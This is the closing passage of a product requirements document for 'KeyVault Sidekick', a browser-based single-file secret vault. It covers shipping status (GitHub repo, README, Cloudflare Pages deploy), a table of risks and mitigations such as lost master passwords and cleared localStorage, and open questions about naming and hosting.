- Closed the single remaining attack vector vs desktop apps: supply-chain on the hosted HTML

### Phase 5 — Shipping (Week 5) — SHIPPED 2026-06-08
- [x] GitHub repo at https://github.com/boblauzon/keyvault-sidekick (private; 4 files: index.html + README.md + PRD + .gitignore; commit `ee0505c`)
- [x] README.md — stack overview, run locally, Claude Code MCP prefill integration guide (URL format, params table, security model, end-to-end example), build plan status table
- [x] Cloudflare Pages deploy — `keyvault-sidekick` project, branch `main`, live at https://keyvault-sidekick.pages.dev (200 OK verified from CF edge; 4 assets uploaded)
- [ ] Landing page — deferred; will use VibeProSoft Hub catalog entry

---

## 11. Risks & Mitigations

| Risk | Mitigation |
|---|---|
| User forgets master password → locked out forever | Warn prominently during setup; encourage `.vault` file backup |
| localStorage cleared by browser (private mode, storage settings) | Warning banner in private/incognito mode; prompt to export `.vault` backup |
| Single-file HTML gets large | Keep MVP lean; if >500 lines, move to a minimal Vite build |
| Crypto API availability | Web Crypto is supported in all modern browsers; add a check on load |

---

## 12. Open Questions

1. **Name final?** "KeyVault Sidekick" fits the VibeProSoft brand. Alternatives: `VaultSidekick`, `SecretSidekick`, `KeyKit`.
2. **Single `.html` or build?** Single file is fastest to ship and easiest to audit. Recommend single file for MVP, revisit at Phase 5.
3. **Cloudflare Pages domain:** Subdomain of `vibeprosoft.com` or standalone domain?

---

*End of PRD v1.0*
